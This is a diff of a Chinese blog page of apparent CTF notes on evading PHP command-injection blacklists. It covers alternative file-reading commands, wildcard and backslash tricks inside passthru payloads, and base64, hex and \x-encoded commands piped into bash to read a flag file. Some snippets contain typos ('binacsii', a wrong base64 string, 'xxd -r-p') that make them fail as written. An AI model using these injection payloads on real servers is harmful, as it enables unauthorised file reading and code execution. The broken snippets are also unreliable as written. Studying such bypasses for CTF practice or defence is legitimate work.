@@ -217,30 +217,35 @@
 <h2 id="八、常见文件读取命令绕过"><a href="#八、常见文件读取命令绕过" class="headerlink" title="八、常见文件读取命令绕过"></a>八、常见文件读取命令绕过</h2><p><code>(!preg_match(&quot;/flag|php|cat|sort|shell\&#39;/i&quot;,$cmd)</code></p>
 <p>绕过方法:</p>
 <ol>
-<li><p>tac:反向显示<br>自下而上</p>
-</li>
-<li><p>more:一页一页的显示档案内容 查看源代码</p>
-</li>
-<li><p>less:效果和more类似</p>
-</li>
-<li><p>tail:查看末尾几行（最后十行）</p>
-</li>
-<li><p>nl:显示的时候显示行号，查看源代码</p>
-</li>
-<li><p>od：以二进制方式读取文件内容<br><code>cmd=passthru(&quot;od -A d -c fla\g/ph\p&quot;)</code>可以把ascii码转换成字符,一行32字节</p>
-</li>
-<li><p>xxd:读取二进制文档<br>左边二进制右边字符</p>
-</li>
-<li><p>sort:主要用于排序文件<br><code>?cmd=passthru(&quot;/usr/bin/so?t fl\ag.p\hp&quot;)</code>应对sort被过滤</p>
-</li>
-<li><p>uniq：报告或删除文件中重复的行</p>
-</li>
-<li><p>file -f:报错出具体内容</p>
-</li>
-<li><p>grep：在文本中查找指定的字符串<br><code>grep fl fla*</code> 从fla*文件中搜索包含fla的字符串的行,一般搜索{</p>
-<p>一定记得最后加分号</p>
-</li>
+<li>tac:反向显示<br>自下而上</li>
+<li>more:一页一页的显示档案内容 查看源代码</li>
+<li>less:效果和more类似</li>
+<li>tail:查看末尾几行（最后十行）</li>
+<li>nl:显示的时候显示行号，查看源代码</li>
+<li>od：以二进制方式读取文件内容<br><code>cmd=passthru(&quot;od -A d -c fla\g/ph\p&quot;)</code>可以把ascii码转换成字符,一行32字节</li>
+<li>xxd:读取二进制文档<br>左边二进制右边字符</li>
+<li>sort:主要用于排序文件<br><code>?cmd=passthru(&quot;/usr/bin/so?t fl\ag.p\hp&quot;)</code>应对sort被过滤</li>
+<li>uniq：报告或删除文件中重复的行</li>
+<li>file -f:报错出具体内容</li>
+<li>grep：在文本中查找指定的字符串<br><code>grep fl fla*</code> 从fla*文件中搜索包含fla的字符串的行,一般搜索{</li>
+<li>一定记得加分号</li>
 </ol>
+<h2 id="九、编码绕过"><a href="#九、编码绕过" class="headerlink" title="九、编码绕过"></a>九、编码绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p>命令编码后的字符串–绕过过滤—&gt;目标服务器—解码—&gt;执行命令</p>
+<h3 id="1-base64编码"><a href="#1-base64编码" class="headerlink" title="1.base64编码"></a>1.base64编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64= base64.b64encode(S)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br></pre></td></tr></table></figure>
+
+<p><code>cat flag.php-&gt;Y2F0lGZsYWcucGhw</code><br><code>echo &quot;Y2F0lGZsYWcucGhw&quot; | base64 -d</code>管道输出符 -d表示decode解码</p>
+<p>让命令执行passthru(‘  1 or 2 or 3  ‘)</p>
+<ol>
+<li><code>echo Y2F0lGZsYWcucGhw | base64 -d | /bin/bash</code> &#x2F;bin&#x2F;bash or bash or sh… </li>
+<li>反引号</li>
+<li>$()</li>
+</ol>
+<h3 id="2-base32"><a href="#2-base32" class="headerlink" title="2.base32"></a>2.base32</h3><p>与base64同</p>
+<h3 id="3-HEX编码-acsii"><a href="#3-HEX编码-acsii" class="headerlink" title="3.HEX编码(acsii)"></a>3.HEX编码(acsii)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binacsii</span><br><span class="line">s = <span class="string">b&quot;tac flag&quot;</span></span><br><span class="line">h= binascii.b2a_hex(s)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br></pre></td></tr></table></figure>
+
+<p><code>tac flag.php-&gt;74616320666c61672e706870</code><br>&#96;&#96;#echo “74616320666c61672e706870” | xxd -r-p | bash&#96;</p>
+<h3 id="4-shellcode编码-16进制机器码"><a href="#4-shellcode编码-16进制机器码" class="headerlink" title="4.shellcode编码(16进制机器码)"></a>4.shellcode编码(16进制机器码)</h3><p>当服务器没装xxd可以用</p>
+<p><code>tac flag.php -&gt;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</code>也就是把ascii每两个之前加\x</p>
 
                 
                 <p class="end">__END__</p>
